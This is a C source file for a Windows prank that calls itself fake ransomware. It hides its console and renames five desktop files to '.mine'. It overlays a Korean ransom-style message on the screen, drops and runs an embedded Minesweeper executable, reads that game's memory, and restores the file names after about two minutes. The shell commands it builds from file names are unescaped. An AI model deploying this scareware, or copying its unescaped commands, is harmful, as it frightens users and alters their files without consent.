#include <stdio.h>
#include <windows.h>
#include "winmine.h"
#include <shellapi.h>
char fn[5][1000];
char rfn[5][1000];
char path[1000];
const char text[] = {
	"mineware-가짜 랜섬웨어\n"
	"바탕화면에 있는 임의의 5개 파일에 *.mine 확장자가 추가되었습니다\n"
	"ㄴ 암호화 x 애초에 암호화 코드도 없음\n"
	"원래대로 되돌리려면 아래 셋 중 하나를 수행하세요\n"
	"1. 일일히 5개 파일을 찾아 확장자를 지운다\n"
	"ㄴ 비추\n"
	"2. 실행된 지뢰찾기를 수행해서 클리어한다\n"
	"ㄴ 지뢰찾기 프로그램 메모리 후킹 중\n"
	"3. 아무것도 안 하고 2분동안 기다린다\n"
	"ㄴ 지뢰찾기 클리어 못해도 원상복구 시켜드림\n"
	"저 경찰서 가는 거 아니져? ㅋ\n"
};
void getfile() {
	GetEnvironmentVariable("HOMEPATH", path, 1000);
	char dir[1000];
	sprintf(dir, "C:\\%s",path);
	SetCurrentDirectory(dir);
	strcat(path, "\\desktop\\");
	sprintf(dir, "dir %s > a.txt",path);
	system(dir);
	FILE* f = fopen("a.txt", "r");
	for (int i = 0; i < 7; i++) fgets(dir, 1000, f);
	for (int i = 0; i < 5; i++) {
		if (fgets(dir, 1000, f) == NULL) break;
		dir[31] = 0;
		if (strcmp(dir + 26, "<DIR>") == 0) continue;
		strcpy(fn[i], dir + 41);
		fn[i][strlen(fn[i]) - 1] = 0;
		printf("%s\n", fn[i]);
	}
}
void rename1() {
	char tmp[1000];
	for (int i = 0; i < 5; i++) {
		sprintf(rfn[i], "%s.mine", fn[i]);
		sprintf(tmp, "ren \"C:%s%s\" \"%s\"", path, fn[i], rfn[i]);
		printf("%s", tmp);
		system(tmp);
	}
}
void print2screen2(const char* string) {
	int f = GetSystemMetrics(SM_CXSCREEN);
	HDC hDC = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), f, 600);
	SelectObject(hDC, hBmp);
	BitBlt(hDC, 0, 0, f, 600, GetDC(0), 0, 0, SRCCOPY);
	SetBkMode(hDC, TRANSPARENT);
	HFONT oFont;
	oFont = CreateFontA(f / 80, 0, 0, 0, 1000, false, false,
		0, ANSI_CHARSET, OUT_DEFAULT_PRECIS,
		CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
		DEFAULT_PITCH | FF_SWISS, "Arial");
	SelectObject(hDC, oFont);
	char* r, str[1000];
	strcpy(str, string);
	int i = 70;
	r = strtok(str, "\n");
	while (r != NULL) {
		SetTextColor(hDC, RGB(0, 0, 0));
		for (int i2 = 20 - f / 800; i2 < 20 + f / 800; i2++)
			for (int j2 = i - f / 800; j2 < i + f / 800; j2++)
				TextOutA(hDC, i2, j2, r, strlen(r));
		SetTextColor(hDC, RGB(255, 255, 255));
		TextOutA(hDC, 20, i, r, strlen(r));
		r = strtok(NULL, "\n");
		i += f / 80;
	}
	HDC hDC2 = GetDC(0);
	BitBlt(hDC2, 0, 0, f, 600, hDC, 0, 0, SRCCOPY);
	ReleaseDC(0, hDC);
	ReleaseDC(0, hDC2);
	DeleteObject(hBmp);
	return;
}
void print2screen(const char* string, int millis) {
	InvalidateRect(0, 0, TRUE);
	Sleep(200);
	print2screen2(string);
	Sleep(millis-200);
}
void executemine() {
	FILE* f = fopen("mine.exe", "wb");
	if (f != 0) {
		fwrite(winmine, 1, sizeof(winmine), f);
		fclose(f);
	}
	ShellExecuteA(0, "open", "mine.exe", 0, 0, SW_SHOW);
}
int left, time,otime;
void showtime() {
	char tmp[100];
	for (int i = 0; i < 110; i++) {
		sprintf(tmp, "경과 시간 %d 남은 지뢰 %d\n",time, left);
		print2screen(tmp,1100);
		if (time != 0 && time == otime && left == 0) {
			print2screen("오옹 대단하네 축하염\n",2000);
			return;
		}
		otime = time;
	}
	print2screen("저런 담번엔 분발하도록 ㅋ\n", 2000);
}
void showtitle() {
	char tmp[1000];
	print2screen(text, 1000);
	print2screen(text, 1000);
	print2screen(text, 1000);
	for (int i = 4; i >= 0; i--) {
		sprintf(tmp, "%s\n%d초\n", text, i);
		print2screen(tmp, 1000);
	}
	print2screen("시작!", 1000);
}
DWORD WINAPI seekmem(LPVOID dat) {
	Sleep(1000);
	int mem1[0x20000];
	//char mem2[0x80000];
	HWND hwnd = FindWindowA(0, "지뢰 찾기");
	DWORD pid = 0;
	GetWindowThreadProcessId(hwnd, &pid);
	HANDLE hd = OpenProcess(PROCESS_VM_READ, FALSE, pid);
	while (1) {
		SIZE_T l;//32 5221
		//32 5607
		if (ReadProcessMemory(hd, (LPVOID)(0x80000 * 32), &mem1,
			0x80000, &l) == 0) {
			left = -1;
			return 0;
		}
		left = mem1[5221];
		time = mem1[5607];
		printf("%d %d\n", left,time);
		Sleep(1000);
	}
	return 0;
}
void rename2() {
	char tmp[1000];
	for (int i = 0; i < 5; i++) {
		sprintf(rfn[i], "%s.mine", fn[i]);
		sprintf(tmp, "ren \"C:%s%s\" \"%s\"", path, rfn[i], fn[i]);
		printf("%s", tmp);
		system(tmp);
	}
	print2screen("원상복구 시켜 드렸습니다 ㅋㅋ\n", 2000);
}
int main() {
	Sleep(1000);
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	getfile();
	rename1();
	showtitle();
	executemine();
	DWORD dwThreadID;
	CreateThread(NULL, 0, seekmem, 0, 0, &dwThreadID);
	showtime();
	rename2();
}